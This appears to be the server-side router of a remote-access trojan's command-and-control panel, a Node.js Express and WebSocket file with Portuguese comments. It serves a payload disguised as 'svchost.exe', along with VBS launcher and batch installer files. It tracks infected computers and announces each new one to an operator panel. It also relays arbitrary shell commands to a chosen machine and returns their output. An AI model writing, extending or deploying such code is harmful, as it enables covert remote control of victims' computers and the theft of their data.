const express = require("express");
const WebSocket = require("ws");
const path = require("path");
const router = express.Router();

let knownClients;
let wssRef;  // <-- referência ao servidor WebSocket

function setKnownClients(map) {
  knownClients = map;
}

function setWSServer(wssInstance) {
  wssRef = wssInstance;
}

let waitingResolvers = [];
let currentCommand = "";
let commandId = "";
let lastClient = null;

function notifyNewComputer(computerInfo) {
  const message = {
    type: "new_computer",
    computer: computerInfo
  };

  if (!wssRef) return;

  wssRef.clients.forEach(client => {
    if (client.readyState === WebSocket.OPEN && client.role === "panel") {
      client.send(JSON.stringify(message));
    }
  });
}

function setLastClient(client) {
  lastClient = client;
}

function handleResult(result) {
  while (waitingResolvers.length > 0) {
    const resolve = waitingResolvers.shift();
    resolve(result);
  }
  currentCommand = "";
  commandId = "";
}

router.get("/dist/:arquivo", (req, res) => {
  let filePath;

  switch (req.params.arquivo) {
    case "hihat":
      filePath = path.resolve(__dirname, "../client/svchost.exe");
      res.download(filePath, "hihat.exe");
      return;

    case "launcher":
      filePath = path.resolve(__dirname, "../client/launcher.vbs");
      res.download(filePath, "launcher.vbs");
      return;

    case "install":
      filePath = path.resolve(__dirname, "../client/install.bat");
      res.download(filePath, "install.bat");
      return;

    default:
      return res.status(404).send("Arquivo não encontrado");
  }
});

router.post("/set_command", async (req, res) => {
  const { command, clientId } = req.body;
  console.log("[set_command] Recebido:", command, "para cliente:", clientId); // Log para verificar o clientId

  if (!command) {
    return res.status(400).json({ error: "Comando não fornecido" });
  }

  if (!clientId) {
    return res.status(400).json({ error: "ID do cliente não fornecido" });
  }

  if (!knownClients) {
    return res.status(500).json({ error: "Mapa de clientes não inicializado" });
  }

  const targetClient = knownClients.get(clientId);

  if (!targetClient || targetClient.readyState !== WebSocket.OPEN) {
    return res.status(400).json({ error: "Cliente não conectado ou inválido" });
  }

  commandId = Date.now().toString();
  currentCommand = command;

  targetClient.send(JSON.stringify({ id: commandId, command }));

  try {
    const result = await new Promise((resolve, reject) => {
      const timeout = setTimeout(() => {
        reject("timeout");
      }, 30000);

      waitingResolvers.push((output) => {
        clearTimeout(timeout);
        resolve(output);
      });
    });

    res.json({ id: commandId, result });
  } catch (err) {
    res.status(504).json({ error: "Tempo esgotado aguardando resultado" });
  }
});


module.exports = {
  router,
  setLastClient,
  handleResult,
  notifyNewComputer,
  setKnownClients,
  setWSServer
};
